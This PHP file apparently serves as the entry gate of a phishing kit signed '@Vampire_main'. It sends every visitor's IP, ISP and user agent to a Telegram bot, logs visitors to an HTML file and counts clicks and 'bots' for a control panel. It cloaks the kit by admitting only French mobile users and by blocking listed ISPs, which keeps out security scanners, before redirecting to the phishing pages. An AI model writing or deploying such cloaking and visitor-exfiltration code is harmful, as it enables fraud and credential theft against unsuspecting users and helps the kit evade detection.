<?php
session_start();
// Include security measures to prevent certain attacks
include './prevents/anti.php';
include './prevents/anti2.php';
// Include configuration settings
include_once "app/config/panel.php";

// Envoyer notification Telegram pour nouvelle visite IMMÉDIATEMENT
$ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');

// Fonction pour récupérer l'ISP (déclarée UNE SEULE FOIS)
if (!function_exists('getIpInfo')) {
    function getIpInfo($ip = '') {
        $ipinfo = @file_get_contents("http://ip-api.com/json/".$ip);
        $ipinfo_json = @json_decode($ipinfo, true);
        return $ipinfo_json;
    }
}
$ipinfo_json = getIpInfo($ip);
$isp = isset($ipinfo_json['as']) ? $ipinfo_json['as'] : 'Inconnu';

$notification_data = "🔔 <b>Ping connection Ulys</b>\n\n" .
    "🌐 <b>IP :</b> <code>$ip</code>\n" .
    "🏢 <b>ISP :</b> <code>$isp</code>\n" .
    "💻 <b>User Agent :</b> <code>" . substr($agent, 0, 100) . "</code>\n" .
    "📅 <b>Date :</b> <code>$date</code>\n\n" .
    "🧛‍♂️ <b>Créé par @Vampire_main</b>";

$telegram_url = "https://api.telegram.org/bot" . TOKEN . "/sendMessage";
$telegram_data = [
    'chat_id' => CHATID,
    'text' => $notification_data,
    'parse_mode' => 'HTML'
];

$ch = curl_init($telegram_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegram_data));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$result = curl_exec($ch);
curl_close($ch);

function update_ini($data, $file)
{
    $content = "";
    $parsed_ini = parse_ini_file($file, true);
    foreach ($data as $section => $values) {
        if ($section === "") {
            continue;
        }
        $content .= $section . "=" . $values . "\n\r";
    }
    if (!$handle = fopen($file, 'w')) {
        return false;
    }
    $success = fwrite($handle, $content);
    fclose($handle);
}

if (PHONE) {
    // Check if the user agent is from a mobile device
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $mobile_keywords = ["Mobile", "Android", "iPhone", "Windows Phone", "Opera Mini", "IEMobile", "BlackBerry"];
    $is_mobile = false;
    foreach ($mobile_keywords as $keyword) {
        if (stripos($user_agent, $keyword) !== false) {
            $is_mobile = true;
            break;
        }
    }
    if (!$is_mobile) {
        $file = './app/Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);
        die("Access denied. Mobile devices only.");
    }
}

function get_client_ip() {
    $ip = null;
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $header) {
        if (array_key_exists($header, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$header]) as $potential_ip) {
                $potential_ip = trim($potential_ip);
                if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    $ip = $potential_ip;
                    break 2;
                }
            }
        }
    }
    return ($ip !== null) ? $ip : '127.0.0.1';
}

// Array of allowed countries - only Spain
$allowed = [
    "FR"
];

// Function to retrieve IP information from external API
function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

if (TESTMODE) {
    $visitorip = "128.78.14.206";
    $ipinfo_json = getIpInfo($visitorip);
    $_SESSION['FIL212sD'] = true;
    header("Location: app/index.php?view=explain&id=".md5(time()));
    exit();
} else {
    $visitorip = get_client_ip();
    $ipinfo_json = getIpInfo($visitorip);
}

// Extract relevant IP information
$status = "{$ipinfo_json['status']}";
$CountryCode = "{$ipinfo_json['countryCode']}";
$org = "{$ipinfo_json['as']}";
$isps = "{$ipinfo_json['isp']}";
$count = "{$ipinfo_json['country']}";
$date = date('Y-m-d H:i:s');
$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];

// Construct a table row for logging
$str = "<tr>$flag<td>$visitorip</td><td>$agent</td><td>$date</td><td>$org</td></tr>";
file_put_contents('./visitors.html', $str, FILE_APPEND | LOCK_EX);

$file = 'app/Panel/stats/stats.ini';
$data = @parse_ini_file($file);
$data['clicks']++;
update_ini($data, $file);


// Check if IP information retrieval was successful
if ($status == "success") {
   
    $operatorsByCountry = array(
        "FR" => array(
            
            "SFR", "Bouygues Telecom", "Free Mobile", "Orange France", "Sosh", "RED by SFR", "B&You",
            "Outremer Telecom", "Digicel", "SFR Caraïbe", "Orange Caraïbe", "Free Caraïbe", "Zeop Mobile",
            "Lycamobile", "Prixtel", "Sosh", "Virgin Mobile", "La Poste Mobile", "Coriolis Telecom", 
        ),
    );
    // Check if the country is allowed
    if (count($allowed) > 0 && !in_array($CountryCode, $allowed)) {

        $file = 'app/Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);
        die("COUNTRY NOT ALLOWED");
    }

    $blocked_isps = include('prevents/block.php');

    foreach ($blocked_isps as $blocked_isp) {
        if (stripos(strtolower($org), strtolower($blocked_isp)) !== false) {
            $file = 'app/Panel/stats/stats.ini';
            $data = @parse_ini_file($file);
            $data['bots']++;
            update_ini($data, $file);
            die("THE REQUEST WAS DENIED: | ". $visitorip ." | ". $org);
        }
    }

    // Check if the country is Spain
    if (array_key_exists($CountryCode, $operatorsByCountry)) {
        $operatorsForCountry = $operatorsByCountry[$CountryCode];

        // Loop through operators for the country
        foreach ($operatorsForCountry as $operator) {
            // Check if the organization matches an allowed operator
            if (HCAPTCHA){
                $_SESSION['FIL212sD'] = true;
                header("Location: app/index.php?view=index&id=".md5(time()));
                exit();
            } else {
                $_SESSION['FIL212sD'] = true;
                header("Location: app/index.php?view=explain&id=".md5(time()));
                exit();
            }
        }
    } else {
        $file = 'app/Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);
        die("THE REQUEST WAS DENIED: "." | ". $visitorip ." | ". $org);
    }


} else {
    $file = 'app/Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['bots']++;
    update_ini($data, $file);
    // Handle the case where IP information retrieval fails
   die('Failed to retrieve IP information.'. $visitorip);
}
?>